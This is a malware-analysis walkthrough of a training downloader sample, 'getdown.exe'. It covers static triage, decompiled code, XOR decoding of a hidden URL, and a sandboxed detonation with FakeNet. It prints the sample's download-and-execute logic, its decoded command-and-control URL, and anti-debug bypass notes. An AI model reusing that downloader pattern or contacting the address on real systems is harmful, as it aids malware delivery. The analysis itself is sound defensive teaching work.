# getdown.exe — reproduction walkthrough

Written to be **redone by hand**, including the dynamic half. Every step gives the
command, the output you should get, and which template row it feeds. If your output
differs from the "expected" block, that is a finding — read the trap notes before
assuming you did it wrong.

- Sample: `..\samples-host\for610\day1\getdown.exe` (from `Malware\day1\getdown.zip`, password `malware`)
- Agent's static tag: `out/static/getdown`
- Agent's dynamic run: `out/dynamic/cd78cf4af8e3-20261110-145417`
- Agent's report: `out/getdown-Malware-Analysis-Report.docx`

**One-line summary of the sample:** a first-stage downloader. It checks for a debugger,
XOR-decodes a URL hidden in `.data`, downloads one file to `%TEMP%\BrB????.tmp`, runs it,
and exits. 852 ms, no persistence.

---

# PART A — Static (runs on the HOST; no VM, nothing executes)

Ghidra and `pe_meta.py` **parse** the file. Rule 1 holds throughout Part A: nothing here
runs the sample, so none of it needs the VM.

## A.0 Regenerate the static artifacts (optional — they already exist)

```bash
set JAVA_HOME=D:\tools\jdk\jdk-25.0.5+8
set GHIDRA_INSTALL_DIR=D:\tools\ghidra\ghidra_12.2_PUBLIC
python host\ghidra_dump.py "..\samples-host\for610\day1\getdown.exe" out\static\getdown
python host\pe_meta.py "..\samples-host\for610\day1\getdown.exe" --json out\static\getdown\pe_meta.json
```

Expected: analysis in ~12 s, `imports: 60 symbols / 2 libs`, `functions: 135`,
`strings: 138`, `decompiler: True`, 13 function bodies written.

**Run `pe_meta.py` every time.** Without it the entropy figures come from Ghidra's
zero-padded virtual blocks and a packed sample can read as clean.

## A.1 Identity — BACKGROUND + STATIC/File Hash + File Size

```bash
set TRIAGE_OUT=out\static\getdown
python host\q.py summary
```

```
sha256     : cd78cf4af8e37b4a9de479867167027887a28527e2738c481a1c6891d707f21a
md5        : 2a8668a6d0e12c7380a26910d504ecbf
filetype   : Portable Executable (PE)   bits=64 proc=x86
counts     : {'functions': 135, 'strings': 138, 'imports': 60, 'decompiled': 13}
```

`pe_meta.py` adds: size **38,912**, sha1 `414300597938d64b3486be6004003d90d565360d`,
imphash `a675367c6d79f8c7b7603d13cfd0a3ff`, entry `0x140001740`, imagebase
`0x140000000`, subsystem **GUI**, linker 10.0, **not signed**, **no icon**, **no
VERSIONINFO**, and no resource directory at all.

## A.2 Compile time — the single best fact in this analysis

```
TimeDateStamp : 1424844737 / 0x54ed67c1 = 2015-02-25 06:12:17 UTC
```

Now compare against its sibling in the same archive:

| sample | TimeDateStamp | UTC |
|---|---|---|
| `getdown.exe` | **1424844737** | 2015-02-25 06:12:17 |
| `brbbot.exe` | **1424844738** | 2015-02-25 06:12:18 |

**Consecutive integers.** One second apart. That is the provenance evidence; everything
else about the relationship is softer. Do the comparison yourself — it is one loop over
`out/static/*/pe_meta.json` — because a sibling-timestamp claim without the siblings is
exactly the kind of assertion this project has been burned by before.

Honest caveat: getdown's filesystem mtime is 2015-02-27, **two days after** its header.
brbbot's mtime matches its header to the second. So getdown's build date has no second
independent corroboration.

## A.3 Packed? — STATIC/Packed + Entropy

```bash
python host\q.py summary      # the sections block
```

```
.text   0x140001000  size=21504  H=6.186  x=True  w=False
.rdata  0x140007000  size=10240  H=4.407  x=False w=False
.data   0x14000a000  size=4096   H=2.243  x=False w=True
.pdata  0x14000d000  size=1536   H=3.821  x=False w=False
.reloc  0x14000e000  size=512    H=3.93   x=False w=False
file entropy H=5.535
```

**NOT PACKED.** `pack_signals()` is silent, and every structural test agrees: 60 imports
(a stub has <15), 135 functions (a stub has <10), max H 6.186 (payload sections run
7.0–8.0), no section with raw 0 + large virtual, nothing W+X, and code denser than data.

**Trap — do not report `.data` as a packing signal.** Its virtual size (8,736) is 2.13x
its raw size (4,096). That is **normal**: uninitialised data costs no file bytes. The
shape that matters is an **executable** section with that ratio. `.text` here is 0.99x.
Quote the ratio and say why it is *not* a signal.

## A.4 Strings — the finding is a NEGATIVE one

```bash
python host\q.py strings "http|www\.|\.com|\.net|\.php|\.exe|/" 30
```

```
4 matches (showed 4)      <- all four are C runtime text (R6033, R6024, 'MM/dd/yy')
```

**No URL, domain, IP or path appears in plaintext anywhere in 138 strings.** A strings
pass alone concludes this downloader has no target. It has one — it is XOR-encoded. See
A.6.

**Trap:** `q.py tag regkey` returns `'GetSystemTimeAsFileTime'`. That is an *import
name*, not a registry path — the known tagging artifact. getdown writes no registry at
all. Do not cite it.

Also absent: any user-agent string. This matters later (C.4).

## A.5 Imports — the import table nearly states the purpose

```bash
python host\q.py imports
```

```
urlmon.dll      1   URLDownloadToFileA
KERNEL32.dll   59   CreateProcessA, GetTempPathA, GetTempFileNameA,
                    IsDebuggerPresent, + 55 CRT support imports
```

One URLMON import + `CreateProcessA` + the two temp-path APIs **is** the downloader
shape: fetch to a temp file, execute it. `IsDebuggerPresent` is the only anti-analysis
import and it is genuinely used.

Use `pe_meta.json: imports_by_dll` for this row — **not** `api_map.json`, which is a
Ghidra cross-reference map and has previously been found missing a genuinely imported
symbol.

## A.6 CODE ANALYSIS — the whole program is one function

```bash
python host\q.py cat network      # -> exactly one function
python host\q.py func 0x140001000
```

135 functions, but `FUN_140001000` (573 bytes) is the **only** one with a capability
score. The rest is MSVCRT.

```c
BVar2 = IsDebuggerPresent();
if (BVar2 == 0) {                              // <-- ANTI-DEBUG GATE

    do { (&DAT_14000aec0)[i] ^= 0x83;          // URL base, 0x80 bytes
         (&DAT_14000aec1)[i] ^= 0x83;
         i += 2; } while (i < 0x80);
    do { (&DAT_14000af40)[i] ^= 0x83;          // query string, 0x80 bytes
         (&DAT_14000af41)[i] ^= 0x83;
         i += 2; } while (i < 0x80);

    GetTempPathA(0x104, &local_528);                     // fail -> return 2
    GetTempFileNameA(&local_528, "BrB", 0, &local_638);  // fail -> return 3
    strncpy(&local_418, &DAT_14000aec0, 0x3ff);
    if (blob2 non-empty) { strncat("?"); strncat(&DAT_14000af40); }
    URLDownloadToFileA(NULL, &local_418, &local_638, 0, NULL);  // fail -> return 1
    CreateProcessA(&local_638, ...);                     // fail -> return 4
}
return 0;
```

**Name which buffer is which before describing anything** — this project has already
written one report backwards by skipping that step:

| buffer | holds |
|---|---|
| `local_528` | the `%TEMP%` directory |
| `local_638` | **the downloaded file's path** — written to by the download AND launched by CreateProcessA. This single buffer *is* the download-and-run. |
| `local_418` | the assembled URL (0x400 bytes) |

**The anti-debug gate is the most important detail here.** The entire body is inside
`if (IsDebuggerPresent() == 0)` and the function returns 0 either way. Under a naively
attached debugger the sample does nothing and reports success.

## A.7 Decode the URL on the host — no VM, no network

The blobs are at VAs `0x14000aec0` and `0x14000af40`; imagebase is `0x140000000`.

```bash
python -I -c "
import pefile
pe = pefile.PE(r'..\samples-host\for610\day1\getdown.exe')
base = pe.OPTIONAL_HEADER.ImageBase
for va in (0x14000aec0, 0x14000af40):
    off = pe.get_offset_from_rva(va - base)
    dec = bytes(b ^ 0x83 for b in pe.__data__[off:off+0x80])
    print(hex(va), hex(off), dec.split(b'\x00')[0])
"
```

```
0x14000aec0  0x8ec0  b'http://1.234.27.146/pcfix.exe'
0x14000af40  0x8f40  b'affid=23456732-34459'
```

→ **`http://1.234.27.146/pcfix.exe?affid=23456732-34459`**

This is the same trick as brbbot's RC4 config, but cheaper: no crypto, just XOR 0x83.
Static alone closes the template's **Network Artifacts** row for the C2 address, URI and
query — before the VM is ever started.

`affid=` is an affiliate identifier, the convention used by pay-per-install distribution
schemes. It is the single most distinctive string in the sample and the best hunting
pivot.

---

# PART B — Screenshot checklist, static

The template names GUI tools (PEView, PEStudio, PEiD, ExeInfo, ByteHist). The analysis
VM has **CFF Explorer**, **Detect It Easy** and **Extra Tools** on the desktop, and those
produce exactly the screenshots the course asks for.

**Opening a sample in CFF Explorer or DIE is safe and does not violate Rule 1** — they
parse, they do not execute. You may do Part B in the VM without detonating anything. You
still revert afterwards, because a live sample was on the guest's disk.

| # | Row | Screenshot | Where |
|---|---|---|---|
| 1 | 8, 11, 12 | file size, MD5/SHA1/SHA256, imphash | CFF Explorer, or `pe_meta.py` terminal |
| 2 | 14 | Section Headers (name, raw/virtual size, chars) | CFF Explorer → Section Headers |
| 3 | 16 | TimeDateStamp `0x54ed67c1` | CFF Explorer → File Header |
| 4 | 18 | subsystem GUI, imagebase, entry, linker | CFF Explorer → Optional Header |
| 5 | 22, 24 | entropy per section + whole file | **Detect It Easy → Entropy** |
| 6 | 10 | no digital signature | CFF Explorer, or DIE |
| 7 | 26 | import table: urlmon!URLDownloadToFileA + KERNEL32 | CFF Explorer → Import Directory |
| 8 | 20 | strings view — show that NO URL is present | DIE → Strings, or Ghidra Defined Strings |
| 9 | **40** | **decompiled `FUN_140001000`** | **Ghidra on the HOST** |
| 10 | 40 | the two XOR loops in the Listing window | Ghidra, `G` → `140001000` |
| 11 | 40 | your terminal showing the decoded URL (A.7) | host |

**Step 9 must be Ghidra, not IDA.** IDA Freeware 7.0 in the guest has **no decompiler**
— you would be screenshotting raw x64 assembly. The saved Ghidra project is already at:

```
..\samples-host\for610\day1\getdown.exe_ghidra\getdown.exe_ghidra.gpr
```

Open it with `D:\tools\ghidra\ghidra_12.2_PUBLIC\ghidraRun.bat` → File → Open Project.
The analysis is already saved, so nothing is recomputed. Press `G`, type `140001000`
(no `0x`), read the Decompile window.

Name translation, printed by `q.py func`:

```
// 0x140001000   ghidra:FUN_140001000   ida:sub_140001000
```

`q.py plan` walks all of this step by step and names the window to capture at each one.
**But only STEP 7 is the malware** — steps 6, 8, 9, 10 are MSVCRT (`__security_init_cookie`,
`__crtCorExitProcess`, `__crtMessageBoxA`, `__report_gsfailure`). They surface because
they call `GetProcAddress`/`LoadLibraryW`, which is CRT plumbing, not the sample hiding
API resolution.

---

# PART C — Dynamic results (what the agent measured, for you to match)

Run: `out/dynamic/cd78cf4af8e3-20261110-145417`
`mode=full`, `timeout=60`, **`elevated=False`**, `in-place=False`, `fakenet=True`

## C.1 The process

```
launched pid 4072, running as sample.exe
2:54:57.553 -> 2:54:58.405   = 852 ms
3,378 own Procmon events, exited on its own (killed pids: none)
```

**TRAP — the process is named `sample.exe`.** In `--copy` mode `detonate.ps1` copies the
sample to `<out>\run\sample.exe`. Querying by the host filename returns **0 events** and
looks exactly like a sample that did nothing. Take the name from `detonate.log`:

```
02:54:57.125  COPIED launch target: C:\triage\dyn\cd78cf4af8e3\run\sample.exe
```

## C.2 The file chain — File System Artifacts (row 31)

```
2:54:57.773121  CreateFile         SUCCESS  %TEMP%\BrBF5BD.tmp   GetTempFileNameA
2:54:58.360552  WriteFile          SUCCESS  %TEMP%\BrBF5BD.tmp   download SUCCEEDED
2:54:58.360797  RegOpenKey   NAME NOT FOUND  ...\IFEO            CreateProcessA starting
2:54:58.362532  CreateFileMapping  SUCCESS  %TEMP%\BrBF5BD.tmp   loader mapping the image
```

The IFEO lookup followed by `CreateFileMapping` on the downloaded file **is** the
`CreateProcessA` — that is what the loader does when starting an image. There is no
`Process Create` because the image was rejected.

The `BrB` prefix is hardcoded at `0x140001000`; the four hex characters are Windows'.
**The glob `%TEMP%\BrB????.tmp` is the indicator, not the exact name.**

## C.3 What was actually downloaded — and why no child appeared

```
path   %TEMP%\BrBF5BD.tmp
size   1,447 bytes
sha256 FE4B63AD9F486B7664C240397CCDEE91FABF15DF5CCD39B80B0EEAA6A47B86E4
magic  3c 68 74 6d  = '<htm'
```

FakeNet-NG's **default HTML page**. Not a PE, so `CreateProcessA` failed and the process
tree stayed at 1 pid.

**Against a live C2 there would be a child process here.** The payload at `/pcfix.exe`
was never obtained, and nothing in this analysis describes it.

## C.4 Network Artifacts (row 33) — static and dynamic agree exactly

```
[Diverter]       sample.exe (4072) requested TCP 1.234.27.146:80
[HTTPListener80] GET /pcfix.exe?affid=23456732-34459 HTTP/1.1
[HTTPListener80] Host: 1.234.27.146
```

Byte-for-byte the URL decoded in A.7. **No DNS** — the target is an IP literal, so
nothing is resolved. `dns_names = 0`. A detection that watches DNS misses this sample.

**TRAP — the User-Agent is NOT an indicator.** The request carried:

```
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; Win64; x64; Trident/7.0; ...)
```

That string is **not in the binary** (A.4 found no UA at all). `URLDownloadToFileA`
supplies the *host's own Internet Explorer* UA, so it describes the analysis machine and
differs on every victim. Reporting it as getdown's UA is a false indicator. Contrast
brbbot, which hardcodes its UA at `0x14000ff30` — that one **is** an indicator.

## C.5 Persistence (row 51) — none, and provable

Checked: Run/RunOnce (HKCU+HKLM), Winlogon, IFEO, User Shell Folders, Services; full
service and scheduled-task diffs; files across TEMP, APPDATA, LOCALAPPDATA, ProgramData,
Startup, Desktop, System32, SysWOW64, Program Files and the sample's own directory.
**Zero writes attributable to the sample.**

Stronger than "not observed": the 60 imports contain **no registry API, no service API,
no CopyFile/MoveFile**. There is no code path to persistence.

**NOT checked by any monitor** (so silence means nothing): WMI subscriptions, COM
hijacking, DLL search-order hijacking, AppInit_DLLs, AppCertDlls. Also invisible: a value
nested below the listed keys, because the snapshot records each key's own values plus
only the *names* of immediate subkeys.

## C.6 Three things in the artifacts that are FakeNet, not the sample

Read these out before attributing anything:

1. **`HKLM\SYSTEM\CurrentControlSet\Services\WinDivert1.3`** — FakeNet's own packet
   driver. It is the only new registry key in the run, and `dyn.py persist` labels it
   `service`. A sample with no persistence therefore shows exactly one "indicator",
   and it is the instrument.
2. **`192.0.2.123`** (RFC 5737 TEST-NET-1) — FakeNet redirects everything there. The 59
   TCP endpoints and the :80/:443 hits from pids 7056, 1304, 2580, 732 etc. are the
   guest's own background traffic.
3. **DNS for `fs.microsoft.com`, `win1710.ipv6.microsoft.com`** etc. — all `svchost`
   (pid 1732) telemetry, not the sample.

`fakenet.log` is the **better** network source than Procmon here, not a backup: Procmon
logged no TCP event at all for pid 4072, while FakeNet's Diverter attributes the flow by
pid.

---

# PART D — Doing the dynamic half yourself

## D.1 Check the rails — every time, not once

```bash
python host\mal.py check
```

Must print `detonate allowed: YES`, with `ethernet0 = hostonly` and
`shared folders (HGFS) disabled` as `[ok]`. **Do not trust any containment claim in
notes that this command does not confirm at run time.** HGFS is a hard FAIL now because
a snapshot revert cannot undo what the guest wrote to the host through a share.

Known warnings that are acceptable: clipboard copy/paste, drag-and-drop, `numvcpus = 1`.

## D.2 Option 1 — reproduce the agent's run exactly (recommended first)

```bash
python host\mal.py detonate "..\samples-host\for610\day1\getdown.exe" --mode full --timeout 60
```

This reverts first, pushes the sample, installs FakeNet, runs Procmon, collects text
artifacts, and **reverts afterwards with verification**. The VMware window is visible
(`gui=True`), so you can watch.

Verify FakeNet actually came up **before** citing any network artifact:

```bash
grep -i fakenet out\dynamic\<tag>\detonate.log     # want: FakeNet-NG up (pid ...)
python host\dyn.py --dir out\dynamic\<tag> summary # want: fakenet=True
```

Your `BrB????.tmp` name and pid will differ from the agent's. The **behaviour** should
match: one temp file created, written, then mapped; one HTTP GET to `1.234.27.146`.

## D.3 Option 2 — manual run, for GUI screenshots

Use this when you need Procmon and FakeNet windows captured. The automated run reverts
and leaves nothing to photograph.

```bash
python host\mal.py revert                       # clean baseline
python host\mal.py setup-guest                  # pushes detonate.ps1 + FakeNet (8 MB)
python host\mal.py push "..\samples-host\for610\day1\getdown.exe" "C:\triage\samples\getdown.exe"
```

Then **inside the VM**, in this order:

1. Start **Procmon** (it is in the baseline snapshot). Set a filter *before* running
   anything: `Process Name is getdown.exe`.
2. Start **FakeNet** elevated, **from its own directory** — it resolves its config
   relative to cwd:
   ```
   cd C:\triage\tools\fakenet3.5
   fakenet.exe -c configs\default.ini
   ```
   Wait until the listeners report ready.
3. Run `C:\triage\samples\getdown.exe`. It lives under a second — have Procmon already
   capturing.
4. Screenshot (see D.4).
5. **Back on the host, revert.** This is the step with no safety net in manual mode:
   ```bash
   python host\mal.py revert
   ```

`detonate` reverts in a `finally` block so it survives errors and Ctrl-C. **Manual mode
does not.** If you walk away before step 5, the VM stays infected.

⚠️ While the sample is live: do not click into the VM, and do not copy/paste between
host and guest — clipboard and drag-and-drop are **not** disabled in the `.vmx`.

## D.4 Screenshot checklist, dynamic

| # | Row | Screenshot |
|---|---|---|
| 1 | 2 | `mal.py check` output — proves hostonly + HGFS off at run time |
| 2 | 33 | FakeNet console showing the `GET /pcfix.exe?affid=...` request |
| 3 | 33 | FakeNet's Diverter line naming the pid |
| 4 | 31 | Procmon filtered to the sample: `CreateFile` → `WriteFile` on `BrB*.tmp` |
| 5 | 31 | Procmon showing the IFEO lookup + `CreateFileMapping` |
| 6 | 31 | Explorer in `%TEMP%` showing the `BrB????.tmp` file |
| 7 | 31 | the downloaded file opened in Notepad — it is FakeNet's HTML page |
| 8 | 51 | Regedit on `...\CurrentVersion\Run` showing **no** new value |
| 9 | 2 | the revert completing, or `mal.py check` after it |

Item 7 is worth capturing precisely because it is *not* the real payload — it documents
honestly what the download actually returned.

`screen.png` is captured automatically at the end of every `detonate` run by the **host**
via vmcli (not pulled from the guest). On the agent's run it shows Internet Explorer
displaying FakeNet's HTTP Listener page instead of `msftconnecttest.com` — good evidence
that FakeNet was intercepting. It does **not** show the sample, because it is taken after
the monitors stop and the sample lived 852 ms.

## D.5 If you run WITHOUT FakeNet, you will get a different answer

This is the most likely way to think the report is wrong.

| | with FakeNet | **without** |
|---|---|---|
| `%TEMP%\BrB????.tmp` | created + **1,447 bytes written** | created, **0 bytes** |
| `WriteFile` | yes | **no** |
| IFEO + `CreateFileMapping` | yes | **no** |
| your conclusion | download-and-run, full chain | "it tried to download and failed" |

Without a fake internet `URLDownloadToFileA` fails and the function returns **1** before
`CreateProcessA` is ever reached. You lose the entire second half of the behaviour.
`--mode basic` does not start FakeNet.

## D.6 Before writing "the sample did nothing"

Seven causes have produced that false reading in this project. Check in this order:

1. **Wrong process name** — it is `sample.exe` in `--copy` mode. Read `detonate.log`'s
   `launch target:` line. *(This one bit the agent during this very analysis.)*
2. **Anti-debug/anti-VM gate** — getdown wraps its whole body in
   `if (IsDebuggerPresent() == 0)` and returns 0 either way. Silent, successful and empty
   is its *intended* output under a debugger.
3. **Exit status** — `0` means it ran and chose to stop; `0xC0000005` + `WerFault` means
   it crashed; no `Process Start` at all means it never launched.
4. **Defender truncation** — a 0-byte sample is not a PE. Check `sc query WinDefend`;
   `Get-MpComputerStatus` failing unelevated proves nothing.
5. **Noise filter** — read `procmon_dropped.json` for what was removed. On this run
   1,355,642 of 1,667,651 rows were dropped.
6. **JSON BOM** — `detonate.ps1` writes UTF-8 with a BOM. A plain
   `json.load(open(p))` raises and every file reads as empty. Use `dyn.py`, or
   `encoding="utf-8-sig"`.
7. **Create-then-delete inside the run window** — the snapshot diff cannot see a file
   whose whole lifetime fits between the two snapshots. Procmon can.

Also: `dyn.py pevents --all` prints the **first** 120 events and says `showed 120 (all)`.
The footer counts are over all rows, but the listing is truncated — to see where a sample
stopped, read `procmon.csv` with a real CSV reader (`csv.DictReader`,
`encoding="utf-8-sig"`) and slice the tail. **Never** `cut -d,` on it: the Detail column
contains quoted commas.

---

# PART E — Summary rows, and what is still missing

**IOCs (45).** Host: `%TEMP%\BrB????.tmp` glob; the create→write→map burst from a process
making exactly one HTTP request; sha256/imphash above. Network: `1.234.27.146`,
`/pcfix.exe`, `affid=23456732-34459`, HTTP/1.1 over TCP/80, **no DNS**. Excluded on
purpose: the User-Agent (C.4).

**Purpose (49).** First-stage downloader. INFERENCE, confidence **HIGH** — supported by
the import table, the single function, the observed end-to-end chain, and the absence of
persistence, config, command handling or any loop.

**Environment-specific impact (53).** **No admin needed** — the run was `elevated=False`
and completed the whole chain. Egress is the only real precondition. Blocking controls,
cheapest first: egress filtering on outbound HTTP (a direct TCP/80 to a bare IPv4 with no
preceding DNS is anomalous), application allowlisting, blocking execution from `%TEMP%`.
**DNS sinkholing would not touch it.**

**Attribution (57).** NONE ATTEMPTED. No PDB, no VERSIONINFO, no certificate, no
resources. The one operator-linked artifact is `affid=23456732-34459` — an affiliate ID
identifies the *distributor* to the operator, not the operator to us. The brbbot
relationship is **provenance, not attribution**, and it is an inference: the build-second
adjacency and the `BrB` prefix support it; the payload was never obtained, so "getdown
downloads brbbot" is unproven.

**Still open on this sample:**

| Row | Status | Why |
|---|---|---|
| 28, 37 Open Source Research | not performed | no tooling; look up **by hash**, never upload |
| 35 Memory Analysis | not performed | no memory image of this detonation exists |
| 42 Debugging | not performed | `dbg.py`'s guest half is not built |

For row 42, note the actionable finding rather than the gap: anyone debugging this sample
must first neutralise the `IsDebuggerPresent` check — patch the conditional after the
call at the top of `0x140001000`, clear `BeingDebugged` in the PEB, or break past the
gate. Otherwise the debugger produces a clean, silent, misleading run.
